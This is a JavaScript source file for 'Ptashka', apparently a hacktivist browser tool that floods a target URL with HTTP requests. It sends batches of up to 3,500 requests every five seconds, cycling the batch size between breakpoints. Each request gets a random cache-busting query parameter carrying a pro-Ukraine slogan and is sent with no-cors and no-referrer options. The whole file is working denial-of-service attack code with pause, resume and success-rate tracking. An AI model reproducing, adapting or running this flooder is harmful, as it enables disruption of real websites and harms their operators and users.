import { v4 as generateUUID } from 'uuid';

import { setCustomInterval } from '../helpers.js';
import {
  PTASHKA_STATUS_READY,
  PTASHKA_STATUS_RUNNING,
  PTASHKA_STATUS_PAUSED,
} from '../constants.js';

/*
-- FLOW --
-- a. Start sending requests starting from 1 to 1000 per 5 seconds
-- b. Start increasing the outgoing requests batch size until it reaches a breakpoint
-- c. Once the breakpoint is reached, start decreasing the outgoing requests batch size 
----- until it reaches a lower breakpoint
*/

// CONSTANTS
const INITIAL_DELAY = 10000; // 10 sec
const INTERVAL_DELAY = 5000; // 5 sec

// depending on the batch resize direction, increase or decrease
// the batch size by multiplying the breakpoint by the factor
const BATCH_STEP_FACTOR = 0.5;
// maximum batch size
const BATCH_SIZE_LIMIT = 3500;
// if the direction is 1, then the batch size is growing
// else if the direction is -1, then the batch size is shrinking
const BATCH_SIZE_DIRECTION_GROW = 1;
const BATCH_SIZE_DIRECTION_SHRINK = -1;
// if the batch size is shrinking, then it should grow, hence
// the next breakpoint will be increased by the growth factor
// and vice versa
const BATCH_SIZE_DIRECTION_GROW_FACTOR = 4;
const BATCH_SIZE_DIRECTION_SHRINK_FACTOR = 0.5;

class Ptashka extends EventTarget {
  constructor(url) {
    super();

    this.url = url;
  }

  url = '';
  status = PTASHKA_STATUS_READY;
  requestsSent = 0;
  requestsSucceed = 0;
  requestsFailed = 0;
  successRate = 0; // from 0 to 100
  timer = null;
  startedAt = new Date().toISOString();
  pausedAt = null;

  batchSizeDirection = BATCH_SIZE_DIRECTION_GROW;
  batchSizeBreakpoint = 64;
  batchSize = 1; // number of ptashka to send at the timer
  batchesSent = 0;

  controller = new AbortController();

  static async send(url) {
    const instance = new Ptashka(url);

    return instance.send();
  }

  async send() {
    if (this.isStatusRunning) {
      console.error(`The Ptashka is already working on ${this.url}.`);

      return;
    }

    this.#setStatusRunning();

    const createRequest = () => {
      const requestOptions = {
        mode: 'no-cors',
        credentials: 'include',
        cache: 'no-store',
        headers: {
          Authorization:
            'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
          'Cache-Control': 'no-store',
        },
        referrerPolicy: 'no-referrer',
        signal: this.controller.signal,
      };

      const uniqueId = generateUUID();

      const searchParamsKey = uniqueId;
      const searchParamsValue = `СЛАВА УКРАЇНІ! ${uniqueId}`;

      const requestUrl = new URL(this.url);

      requestUrl.searchParams.append(searchParamsKey, searchParamsValue);

      const request = new Request(requestUrl, requestOptions);

      return request;
    };

    const sendRequest = async (request) => {
      this.#setRequestsSent((requestsSent) => requestsSent + 1);

      try {
        const response = await fetch(request);

        // TODO: follow a redirect hence modify and resend the request

        this.#incrementRequestsSucceed();

        return response;
      } catch (error) {
        const isAborted = error?.name && error.name === 'AbortError';

        if (!isAborted) {
          this.#incrementRequestsFailed();
        }

        return error;
      }
    };

    const createBatch = () => {
      const batch = [];

      let counter = 0;
      for (counter; counter < this.batchSize; counter += 1) {
        const request = createRequest();

        batch.push(request);
      }

      const isBreakpointReached = this.#isBatchSizeDirectionGrowing
        ? this.batchSize >= this.batchSizeBreakpoint
        : this.batchSize <= this.batchSizeBreakpoint;

      // if the breakpoint is reached
      if (isBreakpointReached) {
        // set a default breakpoint
        let nextBreakpoint = BATCH_SIZE_LIMIT;

        // then check whether the batch size is rising or falling
        switch (this.batchSizeDirection) {
          // if the batch size is rising
          case BATCH_SIZE_DIRECTION_GROW: {
            // then decrease the next breakpoint by multiplying by the fall factor
            nextBreakpoint = this.batchSizeBreakpoint * BATCH_SIZE_DIRECTION_SHRINK_FACTOR;

            break;
          }

          // if the batch size is falling
          case BATCH_SIZE_DIRECTION_SHRINK: {
            // then increase the next breakpoint by multiplying by the rise factor
            nextBreakpoint = this.batchSizeBreakpoint * BATCH_SIZE_DIRECTION_GROW_FACTOR;

            // and check whether the next batch size breakpoint is not higher than a limit
            const isLimitReached = nextBreakpoint > BATCH_SIZE_LIMIT;

            // if the next batch size breakpoint is higher than a limit
            if (isLimitReached) {
              // then limit the next batch size
              nextBreakpoint = BATCH_SIZE_LIMIT;
            }

            break;
          }
        }

        this.#reverseDirection();

        this.batchSizeBreakpoint = nextBreakpoint;
      }

      this.#adjustBatchSize();

      return batch;
    };

    const sendBatch = async (batch) => {
      Promise.allSettled(
        batch.map((request) => {
          sendRequest(request);
        })
      ).then(() => {
        this.#calculateSuccessRate();
      });

      this.#incrementBatchesSent();
    };

    // start with a single request
    const initialRequest = createRequest();
    sendRequest(initialRequest);

    // start a timer with an initial delay before the start of
    // the interval with its own delay
    const initialTimer = setTimeout(() => {
      // iteratively create a new batch of requests and send them with a delay
      const timer = setCustomInterval(
        () => {
          const batch = createBatch();
          sendBatch(batch);
        },
        INTERVAL_DELAY,
        true
      );

      this.#setTimer(timer);
    }, INITIAL_DELAY);

    this.#setTimer(initialTimer);
  }

  async pause() {
    if (!this.isStatusRunning) {
      console.error(`The Ptashka is not working on ${this.url} yet.`);

      return;
    }

    this.#setStatusPaused();

    // abort the fetch requests
    this.#restartController();

    // stop sending requests
    this.#resetTimer();
  }

  async resume() {
    if (!this.isStatusPaused) {
      console.error(`The Ptashka working on ${this.url} is not paused yet.`);

      return;
    }

    await this.send();
  }

  toJSON() {
    const serialized = {
      url: this.url,
      requestsSent: this.requestsSent,
      requestsSucceed: this.requestsSucceed,
      requestsFailed: this.requestsFailed,
      successRate: this.successRate,
      status: this.status,
      startedAt: this.startedAt,
      pausedAt: this.pausedAt,
      batchSizeDirection: this.batchSizeDirection,
      batchSizeBreakpoint: this.batchSizeBreakpoint,
      batchSize: this.batchSize,
      batchesSent: this.batchesSent,
    };

    return serialized;
  }

  // GETTERS
  get isStatusRunning() {
    return this.status === PTASHKA_STATUS_RUNNING;
  }

  get isStatusPaused() {
    return this.status === PTASHKA_STATUS_PAUSED;
  }

  get #isBatchSizeDirectionGrowing() {
    return this.batchSizeDirection === BATCH_SIZE_DIRECTION_GROW;
  }

  // SETTERS
  // NOTE: *always* change props using the setters
  #setStatus = this.#watchPropChange('status', (value) => {
    const currentDateISO = new Date().toISOString();

    this.status = value;

    if (this.isStatusPaused) {
      this.#setPausedAt(currentDateISO);
    }
  });

  #setStatusRunning() {
    this.#setStatus(PTASHKA_STATUS_RUNNING);
  }

  #setStatusPaused() {
    this.#setStatus(PTASHKA_STATUS_PAUSED);
  }

  // TODO: wrap with a throttle
  #setRequestsSent = this.#watchPropChange('requestsSent', (value) => {
    this.requestsSent = value;
  });

  #setRequestsSucceed(value) {
    this.requestsSucceed = value;
  }

  #setRequestsFailed(value) {
    this.requestsFailed = value;
  }

  #setSuccessRate = this.#watchPropChange('successRate', (value) => {
    this.successRate = value;
  });

  #setPausedAt = this.#watchPropChange('pausedAt', (value) => {
    this.pausedAt = value;
  });

  #setTimer(value) {
    this.timer = value;
  }

  #setBatchesSent = this.#watchPropChange('batchesSent', (value) => {
    this.batchesSent = value;
  });

  // HELPERS
  #incrementBatchesSent() {
    this.#setBatchesSent((batchesSent) => batchesSent + 1);
  }

  #incrementRequestsFailed() {
    // TODO: refactor to make all setters accept a function as a value
    this.#setRequestsFailed(this.requestsFailed + 1);
  }

  #incrementRequestsSucceed() {
    this.#setRequestsSucceed(this.requestsSucceed + 1);
  }

  #calculateSuccessRate() {
    const successRate = Math.round((this.requestsSucceed / this.requestsSent) * 100);

    const isSuccessRateValid = Number.isInteger(successRate);

    if (isSuccessRateValid) {
      this.#setSuccessRate(successRate);
    }
  }

  #reverseDirection() {
    this.batchSizeDirection =
      this.batchSizeDirection === BATCH_SIZE_DIRECTION_GROW
        ? BATCH_SIZE_DIRECTION_SHRINK
        : BATCH_SIZE_DIRECTION_GROW;
  }

  #adjustBatchSize() {
    this.batchSize += this.batchSizeDirection * (this.batchSizeBreakpoint * BATCH_STEP_FACTOR);
  }

  #restartController() {
    this.controller.abort();

    this.controller = new AbortController();
  }

  #resetTimer() {
    clearInterval(this.timer);

    this.#setTimer(null);
  }

  #dispatchChange(change) {
    const event = new CustomEvent('change', { detail: change });

    this.dispatchEvent(event);

    const isOnChangeDefined = this.onchange !== undefined;
    if (isOnChangeDefined) {
      this.onchange(change);
    }
  }

  #watchPropChange(prop, setter) {
    return (value) => {
      let nextValue = value;
      const prevValue = this[prop];

      const isValueFunc = typeof value === 'function';

      if (isValueFunc) {
        nextValue = value(prevValue);
      }

      const change = {
        key: prop,
        value: nextValue,
      };

      const result = setter(nextValue);

      this.#dispatchChange(change);

      return result;
    };
  }
}

export default Ptashka;
